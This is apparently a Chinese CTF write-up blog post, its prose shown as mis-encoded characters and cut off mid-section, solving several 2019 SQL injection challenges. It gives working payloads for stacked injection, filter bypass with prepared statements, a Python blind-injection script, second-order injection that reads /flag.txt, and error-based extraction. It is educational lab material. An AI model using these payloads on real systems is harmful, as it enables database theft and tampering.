    <content type="html"><![CDATA[<h2 id="å¼ºç½‘æ¯-2019-éšä¾¿æ³¨">å¼ºç½‘æ¯ 2019 éšä¾¿æ³¨</h2><h3 id="è€ƒç‚¹">è€ƒç‚¹</h3><ul><li>å †å æ³¨å…¥</li><li>é¢„ç¼–è¯‘è¯­å¥</li></ul><h3 id="è§£é¢˜">è§£é¢˜</h3><h4 id="æ–¹æ³•ä¸€">æ–¹æ³•ä¸€</h4><p>åˆ¤æ–­æ³¨å…¥ç‚¹</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200618113111.png" style="zoom:67%;" /><p>ä¹‹åè¿›è¡Œunionè”åˆæ³¨å…¥çš„æ—¶å€™å‘ç°äº†æ­£åˆ™è¿‡æ»¤ å‡ ä¹è¿‡æ»¤äº†æˆ‘ä»¬æ‰€æœ‰èƒ½ç”¨åˆ°çš„è¯­å¥</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200618113206.png" style="zoom:67%;" /><p>å†å°è¯•å †å æ³¨å…¥ï¼Œ <code>show tables </code>æŸ¥è¯¢å½“å‰æ•°æ®åº“ä¸­çš„è¡¨å‘ç°äº†ä¸¤ä¸ªè¡¨</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200618113424.png" style="zoom:67%;" /><p>çœ‹ä¸‹ä¸¤ä¸ªè¡¨çš„ç»“æ„å­—æ®µ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;æŸ¥çœ‹wordsè¡¨çš„å­—æ®µ</span><br><span class="line">&#39;;show columns from words;# </span><br><span class="line">&#x2F;&#x2F;æŸ¥çœ‹1919810931114514è¡¨çš„å­—æ®µ</span><br><span class="line">&#39;;show columns from &#96;1919810931114514&#96;;#</span><br></pre></td></tr></table></figure><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200618113614.png" style="zoom:67%;" /><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200618113642.png" style="zoom:67%;" /><p>éªšå§¿åŠ¿å¼€å§‹äº†ï¼Œæˆ‘ä»¬é»˜è®¤æŸ¥è¯¢çš„è¡¨æ˜¯<code>word</code>è¡¨ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡<code>rename</code>è¯­å¥æŠŠ<code>words</code>è¡¨çš„è¡¨åæ”¹æˆ<code>words1</code>ï¼ŒæŠŠ<code>1919810931114514</code>çš„è¡¨åæ”¹æˆ<code>words</code>ï¼Œç„¶åå†ç”¨<code>alter</code>è¯­å¥æŠŠ<code>flag</code>å­—æ®µåæ”¹æˆ<code>id</code>å³å¯ã€‚ã€‚ã€‚ğŸ˜‚</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;RENAME TABLE &#96;words&#96; TO &#96;words1&#96;;RENAME TABLE &#96;1919810931114514&#96; TO &#96;words&#96;;ALTER TABLE &#96;words&#96; CHANGE &#96;flag&#96; &#96;id&#96; VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;#</span><br></pre></td></tr></table></figure><p>ç”¨ 1â€² or â€˜1â€™=â€™1 è®¿é—®ä¸€ä¸‹</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200618120643.png" alt=""></p><h4 id="æ–¹æ³•äºŒ">æ–¹æ³•äºŒ</h4><p>ä½¿ç”¨MySQLé¢„å¤„ç†è¯­å¥ç»•è¿‡è¿‡æ»¤ã€‚</p><p>æˆ‘ä»¬è¿›è¡Œæ„é€ è¿™ä¸ªè¯­å¥:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @a&#x3D;concat(&quot;sel&quot;,&quot;ect flag from &#96;1919810931114514&#96;&quot;);</span><br><span class="line">prepare sql from @a</span><br><span class="line">execute sql;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;set @a&#x3D;concat(&quot;sel&quot;,&quot;ect flag from &#96;1919810931114514&#96;&quot;);prepare sql from @a;execute sql;# </span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200618123618.png" alt=""></p><p>å¤§å°å†™ç»•è¿‡ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;sEt @a&#x3D;concat(&quot;sel&quot;,&quot;ect flag from &#96;1919810931114514&#96;&quot;);Prepare hello from @a;execute hello;#</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200618123707.png" alt=""></p><h2 id="CISCN2019-Hack-world">CISCN2019 Hack world</h2><h3 id="è€ƒç‚¹-v2">è€ƒç‚¹</h3><ul><li>Boolç›²æ³¨</li><li>Pythonè„šæœ¬ç¼–å†™</li><li>å¼‚æˆ–æ³¨å…¥</li></ul><h3 id="è§£é¢˜-v2">è§£é¢˜</h3><p>æ¯æ¬¡ç¢°åˆ°è¿™ç§SQLæ³¨å…¥çš„é¢˜ç›®éƒ½æ²¡å¤ªå¤šæ€è·¯ã€‚</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200620111314.png" style="zoom:50%;" /><p>æ ¹æ®1å’Œ2è¿”å›ç»“æœçš„ä¸åŒï¼Œå¯èƒ½æ˜¯boolç›²æ³¨ï¼Œ<code>()</code>æ²¡æœ‰è¿‡æ»¤ï¼Œå¯ä»¥ä½¿ç”¨å¤§éƒ¨åˆ†å‡½æ•°ã€‚</p><blockquote><p>ç©ºæ ¼ç»•è¿‡ï¼š<code>%09</code> <code>%0a</code> <code>%0b</code> <code>%0c</code> <code>%0d</code> <code>/**/</code> <code>/*!*/</code>æˆ–è€…ç›´æ¥tab</p></blockquote><p>ä»»ä½•å¯ä»¥è®¡ç®—å‡ºç»“æœçš„è¯­å¥ï¼Œéƒ½å¯ä»¥ç”¨æ‹¬å·åŒ…å›´èµ·æ¥ã€‚è€Œæ‹¬å·çš„ä¸¤ç«¯ï¼Œå¯ä»¥æ²¡æœ‰å¤šä½™çš„ç©ºæ ¼ã€‚</p><p>payloadç¤ºä¾‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(ascii(substr((select(flag)from(flag)),1,1))&#x3D;ascii(&#39;f&#39;),1,2)</span><br></pre></td></tr></table></figure><p>å¦‚æœç­‰å·æˆç«‹çš„è¯ï¼Œé‚£ä¹ˆå°±è¿”å›<code>Hello, glzjin wants a girlfriend.</code>ï¼Œå¦‚æœä¸æˆç«‹é‚£ä¹ˆå°±è¿”å›<code>Do you want to be my girlfriend?</code>ï¼Œç”¨äºŒåˆ†æ³•ç¼–å†™ç›²æ³¨è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://a9475c38-821c-4b23-aa96-87730f0863fe.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;Hello, glzjin wants a girlfriend.&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    mid = (high + low) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        payload = <span class="string">&quot;if(ascii(substr((select(flag)from(flag)),&#123;index&#125;,1))&gt;&#123;char&#125;,1,2)&quot;</span>.format(index=i, char=mid)</span><br><span class="line">        data = &#123;<span class="string">&#x27;id&#x27;</span>: payload&#125;</span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (high + low) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    result += chr(mid)</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><h3 id="æ‹“å±•ï¼šCTFå‡ ç§ç›²æ³¨çš„æ‰‹æ³•">æ‹“å±•ï¼šCTFå‡ ç§ç›²æ³¨çš„æ‰‹æ³•</h3><p><a href="https://www.anquanke.com/post/id/160584#h2-0">https://www.anquanke.com/post/id/160584#h2-0</a></p><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk">CISCN2019 ååŒ—èµ›åŒº Day1 Web5 CyberPunk</h2><h3 id="è€ƒç‚¹-v3">è€ƒç‚¹</h3><ul><li>æ–‡ä»¶åŒ…å«</li><li>äºŒæ¬¡æ³¨å…¥</li><li>æŠ¥é”™æ³¨å…¥</li></ul><h3 id="è§£é¢˜-v3">è§£é¢˜</h3><p>æŸ¥çœ‹æºç æç¤º<code>index.php</code>æœ‰fileå‚æ•°ï¼Œå¯ä»¥ä½¿ç”¨ä¼ªåè®®æ–‡ä»¶åŒ…å«ã€‚</p><p><code>index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $file = $_GET[&quot;file&quot;];</span></span><br><span class="line">$file = (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]) ? $_GET[<span class="string">&#x27;file&#x27;</span>] : <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;</span>,$file)) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;no way!&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>confirm.php</code>ä¸­å¯¹è¾“å…¥çš„usernameå’Œphoneéƒ½è¿›è¡Œäº†è¿‡æ»¤äº†ï¼Œä½†æ˜¯å¿½ç•¥äº†addresså­—æ®µã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="comment">//var_dump($_POST);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $pattern = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    $address = $_POST[<span class="string">&quot;address&quot;</span>];</span><br><span class="line">    $phone = $_POST[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($fetch-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        $msg = $user_name.<span class="string">&quot;å·²æäº¤è®¢å•&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;</span>;</span><br><span class="line">        $re = $db-&gt;prepare($sql);</span><br><span class="line">        $re-&gt;bind_param(<span class="string">&quot;sss&quot;</span>, $user_name, $address, $phone);</span><br><span class="line">        $re = $re-&gt;execute();</span><br><span class="line">        <span class="keyword">if</span>(!$re) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">&quot;è®¢å•æäº¤æˆåŠŸ&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">&quot;ä¿¡æ¯ä¸å…¨&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨<code>change.php</code>ä»æ•°æ®åº“ä¸­å–å‡ºäº†åœ¨<code>confirm.php</code>è¾“å…¥çš„<code>address</code>ï¼Œè¿™æ ·å°±é€ æˆäº†äºŒæ¬¡æ³¨å…¥ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $pattern = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    $address = addslashes($_POST[<span class="string">&quot;address&quot;</span>]);</span><br><span class="line">    $phone = $_POST[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.$address.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.$row[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.$row[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">        $result = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>(!$result) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">&quot;è®¢å•ä¿®æ”¹æˆåŠŸ&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">&quot;æœªæ‰¾åˆ°è®¢å•!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">&quot;ä¿¡æ¯ä¸å…¨&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ€è·¯å·²ç»å¾ˆæ˜ç¡®äº†ï¼Œå…ˆåœ¨æäº¤è®¢å•çš„æ—¶å€™çš„åœ°å€å¤„æ„é€ ä¸€ä¸ªç”¨æ¥æ³¨å…¥çš„è¯­å¥ï¼Œç„¶åå†ä¿®æ”¹ä¸€ä¸‹è®¢å•ï¼Œå®Œæˆæ³¨å…¥ã€‚åˆ©ç”¨updatexmlå‡½æ•°å› ä¸ºæ ¼å¼çš„é”™è¯¯ï¼Œå›æ˜¾äº†å…³é”®ä¿¡æ¯çš„åŸç†ï¼Œæ„é€ å¦‚ä¸‹æŠ¥é”™æ³¨å…¥æ”»å‡»è¯­å¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(load_file(&#39;&#x2F;flag.txt&#39;),1,20)),0x7e),1)#</span><br><span class="line">&#x2F;&#x2F;å¦‚æœflagå¤ªé•¿çš„è¯ï¼Œé€šè¿‡æ”¹å˜substrçš„èµ·å§‹å€¼ï¼Œå°±å¯ä»¥æŠŠflagå‰©ä¸‹çš„éƒ¨åˆ†æŸ¥å‡ºæ¥</span><br></pre></td></tr></table></figure><h2 id="SUCTF2019-EasySQL">SUCTF2019 EasySQL</h2><h3 id="è€ƒç‚¹-v4">è€ƒç‚¹</h3><ul><li><p>å †å æ³¨å…¥</p></li><li><p>sql_modeå‚æ•°</p><blockquote><p>Oracle åœ¨ç¼ºçœæƒ…å†µä¸‹æ”¯æŒä½¿ç”¨ <code>&quot; || &quot;</code>è¿æ¥å­—ç¬¦ä¸² ï¼Œ <strong>ä½†æ˜¯åœ¨MySQLä¸­ç¼ºçœä¸æ”¯æŒ</strong> ï¼ŒMySQL ç¼ºçœä½¿ç”¨ CONCAT ç³»åˆ—å‡½æ•°æ¥è¿æ¥å­—ç¬¦ä¸²</p></blockquote></li></ul><h3 id="è§£é¢˜-v4">è§£é¢˜</h3><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200617144001.png" style="zoom:67%;" /><p>FUZZåå‘ç°è¿‡æ»¤äº†ä¸å°‘å…³é”®å­—ï¼Œå¯ä»¥è¾“å…¥å•ä¸ªæ•°å­—ï¼Œè¾“å‡ºçš„è¯­å¥åº”è¯¥æ˜¯ç”¨<code>var_dump()</code>å‡½æ•°ï¼Œè€ƒè™‘å †å æ³¨å…¥ã€‚</p><p>è¯»å–å½“å‰æ•°æ®è¡¨ï¼š</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200617144413.png" alt=""></p><p>ä½†æ˜¯Flagä¹Ÿè¢«è¿‡æ»¤äº†ã€‚æ®è¯´æ¯”èµ›çš„æ—¶å€™æ³„éœ²æºç äº†ã€‚ã€‚ã€‚</p><p><strong>è¿æ¥æ•°æ®åº“å¹¶ä»URLè·å–å‚æ•°</strong></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200617144958.png" alt=""></p><p><strong>å¯¹è·å–çš„å‚æ•°è¿›è¡Œå¤„ç†åå¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ ï¼Œ å¹¶ä¸”è¿”å›ç»“æœ</strong></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200617145024.png" alt=""></p><p>å…¶å®ä¸»è¦å°±æ˜¯ SQL æŸ¥è¯¢è¯­å¥ : <strong><code>select &quot;.$post['query'].&quot;||flag from Flag&quot;;</code></strong></p><p>å¯ä»¥é€šè¿‡ä¿®æ”¹ sql_mode æ¨¡å¼ : <strong>PIPES_AS_CONCAT</strong> æ¥å®ç°å°† <code>&quot; || &quot;</code>è§†ä¸º <strong>å­—ç¬¦ä¸²è¿æ¥ç¬¦</strong> è€Œé <strong>æˆ–</strong> è¿ç®—ç¬¦ã€‚</p><p>payloadï¼š<code>1;set sql_mode=PIPES_AS_CONCAT;SELECT 1</code></p><p>æ‹¼æ¥åå°±å˜æˆäº† <code>SELECT 1;set sql_mode=PIPES_AS_CONCAT;SELECT 1 || flag FROM Flag</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200617145626.png" alt=""></p><h3 id="éé¢„æœŸ">éé¢„æœŸ</h3><p>Payload : <code>\*,1</code></p><p>æ‹¼æ¥åå°±å˜æˆäº† <code>SELECT \* ,1 || flag FROM Flag</code></p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL">æå®¢å¤§æŒ‘æˆ˜ 2019 EasySQL</h2><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL">æå®¢å¤§æŒ‘æˆ˜ 2019 LoveSQL</h2><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL">æå®¢å¤§æŒ‘æˆ˜ 2019 BabySQL</h2><h2 id="æå®¢å¤§æŒ‘æˆ˜2019-HardSQL">æå®¢å¤§æŒ‘æˆ˜2019 HardSQL</h2><h3 id="è€ƒç‚¹-v5">è€ƒç‚¹</h3><ul><li>MySQLæŠ¥é”™æ³¨å…¥</li></ul><h3 id="è§£é¢˜-v5">è§£é¢˜</h3><p>å…³é”®è¯FUZZä¸€ä¸‹å‘ç°è¿‡æ»¤äº†ç©ºæ ¼ï¼Œorï¼Œupdateï¼Œhandlerï¼Œ/ï¼Œ=ç­‰å¸¸è§å­—ç¬¦ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥è¯•ä¸€ä¸‹æŠ¥é”™æ³¨å…¥ï¼Œç›´æ¥ä¸Špayloadï¼š</p><p>çˆ†æ•°æ®åº“å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;^extractvalue(1,concat(0x7e,(select(database()))))#</span><br><span class="line">&#x2F;&#x2F; geek</span><br></pre></td></tr></table></figure><p>çˆ†æ•°æ®è¡¨å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database()))))#</span><br><span class="line">&#x2F;&#x2F; H4rDsq1</span><br></pre></td></tr></table></figure><p>çˆ†åˆ—å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;))))#</span><br><span class="line">&#x2F;&#x2F; id,username,password</span><br></pre></td></tr></table></figure><p>çˆ†å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;^extractvalue(1,concat(0x7e,(select(password)from(H4rDsq1))))#</span><br><span class="line">&#x2F;&#x2F; flag&#123;d994a91e-d9d6-4901-b025-b8</span><br></pre></td></tr></table></figure><p>å‘ç°æ˜¾ç¤ºä¸å®Œå…¨ï¼Œsubstr()å‡½æ•°æ— æ•ˆï¼Œå¯ä»¥ä½¿ç”¨reverse()å‡½æ•°ç¿»è½¬ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;^extractvalue(1,concat(0x7e,(select(reverse((select(password)from(H4rDsq1)))))))#</span><br><span class="line">&#x2F;&#x2F; &#125;007f9f56108b-520b-1094-6d9d-e1</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ä½¿ç”¨left()å’Œright()å‡½æ•°ç»•è¿‡ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;^extractvalue(1,concat(0x7e,(select(left(password,30))from(H4rDsq1))))#</span><br><span class="line">&#x2F;&#x2F; flag&#123;d994a91e-d9d6-4901-b025-b</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;^extractvalue(1,concat(0x7e,(select(right(password,30))from(H4rDsq1))))#</span><br><span class="line">&#x2F;&#x2F; e-d9d6-4901-b025-b80165f9f700&#125;</span><br></pre></td></tr></table></figure><h2 id="æå®¢å¤§æŒ‘æˆ˜2019-FinalSQL">æå®¢å¤§æŒ‘æˆ˜2019 FinalSQL</h2><h3 id="è€ƒç‚¹-v6">è€ƒç‚¹</h3><ul><li>MySQL regxç›²æ³¨</li></ul><h3 id="è§£é¢˜-v6">è§£é¢˜</h3><p>è¿›å…¥é¢˜ç›®ç»™äº†å‡ ä¸ªhintï¼Œé¦–å…ˆç¡®å®šæ˜¯ç›²æ³¨ï¼Œå½“id=6çš„æ—¶å€™å›æ˜¾<code>Clever! But not this table.</code>ã€‚</p><p>ç™»å½•æ¡†ç»è¿‡æµ‹è¯•åæ²¡æœ‰å¯æ³¨å…¥çš„ç‚¹ï¼Œå°è¯•idå‚æ•°åå‘ç°è¿‡æ»¤ç©ºæ ¼ï¼Œ/**/ä»¥åŠifç­‰å…³é”®å­—ã€‚æµ‹è¯•æ³¨å…¥ç‚¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 